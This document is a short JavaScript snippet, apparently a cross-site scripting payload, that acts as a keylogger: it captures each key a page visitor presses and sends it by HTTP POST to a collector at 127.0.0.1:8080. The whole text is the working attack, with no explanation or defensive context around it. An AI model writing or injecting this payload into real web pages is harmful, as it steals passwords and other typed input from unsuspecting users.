<script>
    document.onkeypress = function(evt) {
       evt = evt || window.event
       key = String.fromCharCode(evt.charCode)
       if (key) {
          var http = new XMLHttpRequest();
          var param = encodeURI(key)
          http.open("POST","http://127.0.0.1:8080/"+"key="+param,true);
          http.send(null);
       }
    }

</script>
